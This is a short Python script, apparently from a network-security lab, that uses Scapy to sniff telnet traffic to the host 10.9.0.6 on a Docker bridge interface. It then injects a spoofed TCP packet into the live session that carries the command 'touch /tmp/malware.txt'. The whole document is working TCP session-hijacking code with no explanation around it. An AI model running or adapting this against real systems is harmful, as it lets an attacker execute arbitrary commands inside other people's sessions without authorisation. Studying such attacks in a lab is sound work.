#!usr/bin/env python3
from scapy.all import *

iface = 'br-efe15936ac80'

def hijack(pkt):

	src_ip = pkt[IP].src
	dst_ip = pkt[IP].dst
	src_port = pkt[TCP].sport
	dst_port = pkt[TCP].dport
	seq = pkt[TCP].seq
	ack = pkt[TCP].ack

	ip = IP(src=dst_ip, dst=src_ip)
	tcp = TCP(sport=dst_port, dport=src_port, flags="A", seq=seq, ack=ack)
	data = "\n touch /tmp/malware.txt\n"

	rst = ip/tcp/data
	send(rst, verbose=0, iface=iface)

def main():
	# Sniffing exchanged packets
	print('[👃 SNIFFING AND TRYING HIJACKING]')
	pkt = sniff(iface=iface, filter='tcp port 23 and host 10.9.0.6', prn=hijack)

if __name__ == '__main__':
	main()